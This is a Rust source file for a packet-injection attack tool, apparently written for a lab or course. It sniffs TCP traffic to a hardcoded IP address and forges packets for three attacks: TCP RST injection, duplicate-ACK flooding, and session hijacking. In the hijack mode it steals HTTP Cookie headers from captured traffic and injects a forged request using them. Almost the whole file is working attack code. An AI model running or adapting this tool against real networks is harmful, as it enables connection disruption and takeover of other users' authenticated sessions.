mod os;

use crate::os::OsInfo;
use etherparse::{EtherType, Ethernet2Header, IpNumber, Ipv4Header, PacketBuilder, TcpHeader};
use pcap::{Active, Capture, Device};
use std::hash::BuildHasher;
use std::thread::sleep;
use std::thread::{self, Builder};
use std::time::Duration;

enum AttackType {
    RSTInjection,
    DuplicateAck,
    SessionHijack,
}

fn main() {
    let OsInfo {
        interface,
        device_mac,
        device_ip,
    } = OsInfo::fetch().expect("os fetch error");

    let attack_type = &AttackType::RSTInjection;

    let mut cap = get_capture(interface.as_str());
    let mut send_cap = get_capture(interface.as_str());

    // similar syntax to wireshark (BPF)
    // some examples:
    //
    // no filter: empty string
    // experimental protocol: ip protochain 253
    // TCP protocol: tcp
    let filter = "tcp and host 80.249.99.148";
    cap.filter(filter, true).expect("filter error");

    println!("listening on interface {} for packets...", interface);

    // start sending packets in a separate thread

    /*
    thread::spawn(move || {
        test_sending_packets(interface.as_str());
    });
    */

    // listen to incoming packets
    loop {
        match cap.next_packet() {
            Ok(packet) => {
                println!("captured a packet");

                let parse_res = parse_packet_to_tcp(packet.data);

                match parse_res {
                    Ok((ethernet_header, ipv4_header, tcp_header, payload)) => {
                        perform_hack(
                            ethernet_header,
                            ipv4_header,
                            tcp_header,
                            payload,
                            attack_type,
                            &mut send_cap,
                        );
                    }
                    Err(_) => {
                        // Suppress error prints to avoid flooding in console
                    }
                }
            }
            Err(pcap::Error::TimeoutExpired) => {
                println!("timeout");
            }
            Err(e) => {
                println!("error reading packet: {:?}", e);
            }
        }

        println!();
    }
}

/**
Parses the raw packet to a TCP packet object
Returns an error if the frame is not Ethernet(IPv4(TCP))
*/
fn parse_packet_to_tcp(
    packet_data: &[u8],
) -> Result<(Ethernet2Header, Ipv4Header, TcpHeader, &[u8]), String> {
    match Ethernet2Header::from_slice(packet_data) {
        Ok((ethernet_header, ethernet_bytes)) => {
            let ether_type = ethernet_header.ether_type;
            if ether_type == EtherType::IPV4 {
                match Ipv4Header::from_slice(ethernet_bytes) {
                    Ok((ipv4_header, ipv4_bytes)) => {
                        println!("ipv4 packet captured");

                        let protocol = ipv4_header.protocol;
                        match protocol {
                            IpNumber::TCP => match TcpHeader::from_slice(ipv4_bytes) {
                                Ok((tcp_header, tcp_bytes)) => {
                                    println!("tcp packet captured: {:?}", tcp_bytes);

                                    Ok((ethernet_header, ipv4_header, tcp_header, tcp_bytes))
                                }
                                Err(e) => Err(e.to_string()),
                            },
                            _ => Err(format!("protocol was not TCP, but {:?}", protocol)),
                        }
                    }
                    Err(e) => Err(e.to_string()),
                }
            } else if ether_type == EtherType::IPV6 {
                Err("ipv6 handling not implemented".to_string())
            } else {
                Err("unsupported ethertype protocol (not IP)".to_string())
            }
        }
        Err(e) => Err(e.to_string()),
    }
}

/*
Performs the attack, by building and sending a forged packet, based on the captured packet and the attack type
*/
fn perform_hack(
    ethernet_header: Ethernet2Header,
    ipv4_header: Ipv4Header,
    tcp_header: TcpHeader,
    payload: &[u8],
    attack_type: &AttackType,
    send_cap: &mut Capture<Active>,
) {
    match attack_type {
        AttackType::RSTInjection => {
            //No need for a payload, since RST packets don't carry any data
            let payload = &[];
            // Build a RST packet, with the source and destination fields reversed
            let builder =
                PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
                    .ipv4(ipv4_header.destination, ipv4_header.source, ipv4_header.time_to_live)
                    .tcp(
                        tcp_header.destination_port,
                        tcp_header.source_port,
                        tcp_header.acknowledgment_number,
                        tcp_header.window_size,
                    )
                    .rst();
            // Write the packet and send it
            let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
            builder.write(&mut packet, payload).unwrap();
            send_cap.sendpacket(packet.as_slice()).unwrap();
            println!("RST injection sent");
        }

        AttackType::DuplicateAck => {
            // No need for a payload, since ACK packets don't carry any data
            let payload = &[];
            // Build an ACK packet, with the source and destination fields reversed
            let builder =
                PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
                    .ipv4(ipv4_header.destination, ipv4_header.source, ipv4_header.time_to_live)
                    .tcp(
                        tcp_header.destination_port,
                        tcp_header.source_port,
                        tcp_header.acknowledgment_number,
                        tcp_header.window_size,
                    )
                    .ack(tcp_header.sequence_number);
            // Write the packet and send it 3 times
            let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));
            builder.write(&mut packet, payload).unwrap();
            send_cap.sendpacket(packet.as_slice()).unwrap();
            send_cap.sendpacket(packet.as_slice()).unwrap();
            send_cap.sendpacket(packet.as_slice()).unwrap();
            println!("3 times ACK sent");
        }

        AttackType::SessionHijack => {
            // Extract the cookie from the payload, if it exists
            let Some(cookie) = extract_cookie(payload) else {
                println!("no cookie in payload, skipping");
                return;
            };

            println!("cookie stolen: {}", cookie);
            // Build a forged HTTP request, using the extracted cookie and the host IP address
            let host_ip = format!(
                "{}.{}.{}.{}",
                ipv4_header.destination[0], ipv4_header.destination[1],
                ipv4_header.destination[2], ipv4_header.destination[3],
            );
            let forged_payload = build_forged_request(&cookie, &host_ip);
            // Calculate the next sequence number for the TCP packet, based on the current sequence number and the length of the payload
            let seq = next_seq(&tcp_header, payload); 
            let ack = tcp_header.acknowledgment_number;

            // Build a TCP packet with the forged payload
            let builder =
                PacketBuilder::ethernet2(ethernet_header.source, ethernet_header.destination)
                    .ipv4(ipv4_header.source, ipv4_header.destination, ipv4_header.time_to_live)
                    .tcp(
                        tcp_header.source_port,
                        tcp_header.destination_port,
                        seq,
                        tcp_header.window_size,
                    )
                    .ack(ack);
            // Write the packet and send it
            let mut packet = Vec::<u8>::with_capacity(builder.size(forged_payload.len()));
            builder.write(&mut packet, &forged_payload).unwrap();
            send_cap.sendpacket(packet.as_slice()).unwrap();
            println!("forged request sent");
        }
    }
}

/*
Extracts the Cookie header from the payload, if it exists
*/
fn extract_cookie(payload: &[u8]) -> Option<String> {
    let text = std::str::from_utf8(payload).ok()?;

    // Look for Cookie header in HTTP request
    for line in text.lines() {
        if line.to_lowercase().starts_with("cookie:") {
            return Some(line.trim().to_string());
        }
    }
    None
}

/*
Calculates the next sequence number for the TCP packet, based on the current sequence number and the length of the payload
*/
fn next_seq(tcp_header: &TcpHeader, payload: &[u8]) -> u32 {
    tcp_header
        .sequence_number
        .wrapping_add(payload.len() as u32)
}

/*
Builds a forged HTTP request, using the extracted cookie and the host IP address
*/
fn build_forged_request(cookie: &str, host_ip: &str) -> Vec<u8> {
    format!(
        "GET /secret HTTP/1.1\r\nHost: {}\r\n{}\r\nConnection: close\r\n\r\n",
        host_ip, cookie
    )
    .into_bytes()
}

/*
Create a capture, that can be used to send or intercept packets
*/
fn get_capture(interface: &str) -> Capture<Active> {
    let main_device = Device::list()
        .expect("error listing devices")
        .into_iter()
        .find(|d| d.name == interface)
        .expect(format!("could not find interface {}", interface).as_str());

    main_device.open().expect("error opening capture")
}
